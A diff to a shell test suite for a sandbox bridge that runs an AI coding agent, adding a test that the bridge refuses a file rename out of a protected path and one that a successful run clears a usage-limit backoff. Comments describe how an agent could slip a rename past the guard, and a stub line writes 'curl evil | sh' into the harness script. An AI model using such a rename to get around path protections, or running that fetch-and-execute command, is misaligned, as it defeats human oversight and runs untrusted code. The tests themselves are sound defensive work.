@@ -693,7 +693,11 @@ git -C "$SANDBOX_TEST_REPO" config user.name test
 git -C "$SANDBOX_TEST_REPO" config user.email test@example.com
 printf 'export const existing = true;\n' > "$SANDBOX_TEST_REPO/client/src/existing.ts"
 printf 'operator instructions\n' > "$SANDBOX_TEST_REPO/server/app/matcha/services/huume/CLAUDE.md"
-git -C "$SANDBOX_TEST_REPO" add client/src/existing.ts server/app/matcha/services/huume/CLAUDE.md
+# A TRACKED file under a denied path, so a rename out of it has a real source.
+mkdir -p "$SANDBOX_TEST_REPO/deploy"
+printf 'deploy notes\n' > "$SANDBOX_TEST_REPO/deploy/notes.txt"
+git -C "$SANDBOX_TEST_REPO" add client/src/existing.ts \
+  server/app/matcha/services/huume/CLAUDE.md deploy/notes.txt
 git -C "$SANDBOX_TEST_REPO" commit --quiet -m base
 printf 'host-only-secret\n' > "$SANDBOX_TEST_REPO/secrets/private.pem"
 
@@ -1215,6 +1219,7 @@ printf '### Summary\nstub\n' > "$report_path"
 printf '{"schema_version":1}\n' > "$decision_path"
 printf 'export const fine = true;\n' > "$workspace/client/src/fine.ts"
 [ "${CODEX_STUB_TOUCH_HARNESS:-0}" != 1 ] || printf 'curl evil | sh\n' > "$workspace/scripts/agent-sandbox.sh"
+[ "${CODEX_STUB_RENAME_HARNESS:-0}" != 1 ] || git -C "$workspace" mv deploy/notes.txt client/src/notes.txt
 [ "${CODEX_STUB_USAGE_LIMIT:-0}" != 1 ] || { echo "ERROR: You've hit your usage limit. Try again at 5:31 AM."; exit 1; }
 EOF
 chmod +x "$TMP_DIR/deny-bin/codex"
@@ -1244,6 +1249,25 @@ check "the self-audit lane can narrow the denylist to CI/deploy and repair the h
 rm -f "$SANDBOX_TEST_REPO/scripts/agent-sandbox.sh" "$SANDBOX_TEST_REPO/client/src/fine.ts"
 git -C "$SANDBOX_TEST_REPO" checkout -q -- . 2>/dev/null || true
 
+# Rename detection reports only the DESTINATION path for a rename pair, so a
+# model could move a protected file onto an allowed path and have the deletion
+# applied to the trusted checkout with the guard never seeing the source.
+PATH="$TMP_DIR/deny-bin:$PATH" AUTOPR_SANDBOX_TEST_DIRECT=1 CODEX_STUB_RENAME_HARNESS=1 \
+AUTOPR_SANDBOX_REPO_ROOT="$SANDBOX_TEST_REPO" \
+AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/sandbox-runtime" \
+  "$AUTOPR_DIR/run-codex-sandboxed.sh" "$TMP_DIR/sandbox-prompt.txt" \
+  "$TMP_DIR/sandbox-report-rename.md" "$TMP_DIR/sandbox-decision-rename.json" \
+  -f "$TMP_DIR/sandbox-context.json" >"$TMP_DIR/sandbox-rename.log" 2>&1
+sandbox_rename_rc=$?
+check "msandbox bridge refuses a RENAME out of a protected path, not just an edit" \
+    $([ "$sandbox_rename_rc" != 0 ] \
+      && grep -q 'protected path' "$TMP_DIR/sandbox-rename.log" \
+      && [ -e "$SANDBOX_TEST_REPO/deploy/notes.txt" ] \
+      && [ ! -e "$SANDBOX_TEST_REPO/client/src/notes.txt" ] \
+      && echo 0 || echo 1)
+rm -f "$SANDBOX_TEST_REPO/client/src/fine.ts"
+git -C "$SANDBOX_TEST_REPO" checkout -q -- . 2>/dev/null || true
+
 # A usage-limit exit is a lane-wide condition: the bridge records it for the
 # dispatcher and still returns Codex's own exit status to its caller.
 PATH="$TMP_DIR/deny-bin:$PATH" AUTOPR_SANDBOX_TEST_DIRECT=1 CODEX_STUB_USAGE_LIMIT=1 \
@@ -1257,6 +1281,18 @@ sandbox_limit_rc=$?
 check "a Codex usage-limit exit writes the backoff marker and preserves the exit status" \
     $([ "$sandbox_limit_rc" = 1 ] && jq -e '.resume_at > now' "$TMP_DIR/bridge-backoff.json" >/dev/null 2>&1 \
       && echo 0 || echo 1)
+# Nothing else clears the marker, so a single usage-limit hit would hold every
+# lane until resume_at (up to 24 h) even after the quota came back.
+PATH="$TMP_DIR/deny-bin:$PATH" AUTOPR_SANDBOX_TEST_DIRECT=1 \
+AUTOPR_CODEX_BACKOFF_FILE="$TMP_DIR/bridge-backoff.json" \
+AUTOPR_SANDBOX_REPO_ROOT="$SANDBOX_TEST_REPO" \
+AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/sandbox-runtime" \
+  "$AUTOPR_DIR/run-codex-sandboxed.sh" "$TMP_DIR/sandbox-prompt.txt" \
+  "$TMP_DIR/sandbox-report-clear.md" "$TMP_DIR/sandbox-decision-clear.json" \
+  -f "$TMP_DIR/sandbox-context.json" >/dev/null 2>&1
+sandbox_clear_rc=$?
+check "a successful Codex run clears the lane-wide usage-limit backoff" \
+    $([ "$sandbox_clear_rc" = 0 ] && [ ! -e "$TMP_DIR/bridge-backoff.json" ] && echo 0 || echo 1)
 rm -f "$SANDBOX_TEST_REPO/client/src/fine.ts"
 
 ################################################################################
